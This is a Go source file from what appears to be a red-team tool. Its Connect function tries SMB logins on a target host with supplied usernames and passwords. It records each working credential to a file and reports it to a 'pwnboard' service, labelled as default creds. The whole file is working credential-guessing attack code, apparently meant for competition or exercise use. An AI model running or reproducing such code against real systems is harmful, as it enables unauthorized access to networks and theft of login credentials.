package smb

import (
	"fmt"
	"net"
	"os"
	"sync"

	"github.com/hirochachacha/go-smb2"
	"github.com/opt/red-script/internal/files"
	"github.com/opt/red-script/internal/pwnboard"
)

// Attempts to use the provided user and pass to log into SMB on the provided host.
func Connect(host, user, password string, wg *sync.WaitGroup) {
	defer wg.Done()

	// Attempt to dial SMB on host
	conn, err := net.Dial("tcp", host)
	if err != nil {
		os.Stderr.WriteString("ERROR: Initial SMB server dial failed.")
		os.Stderr.WriteString(err.Error())
		return
	}
	defer conn.Close()

	// Setup dialer used to attempt logging into SMB on host
	smbConn := &smb2.Dialer{
		Initiator: &smb2.NTLMInitiator{
			User:     user,
			Password: password,
			Domain:   "SMB", // TODO: Note that this value is currently being assumed and might need to be changed.
		},
	}

	// Redial with smbConn (provided user and pass) to attempt logging into SMB
	dial, err := smbConn.Dial(conn)
	if err != nil {
		os.Stderr.WriteString("ERROR: Could not connect to SMB server.")
		os.Stderr.WriteString(err.Error())
		return
	}
	defer logOff(dial)

	files.WriterChan <- fmt.Sprintf("smb:%s:%s:%s\n", host, user, password)

	// Send successful login creds to pwnboard
	pwnboard.SendUpdate(host, fmt.Sprintf("smb:%s:%s:Default creds", user, password))
}

// Created as a function so that it is easy to defer.
func logOff(dial *smb2.Session) {
	_ = dial.Logoff()
}
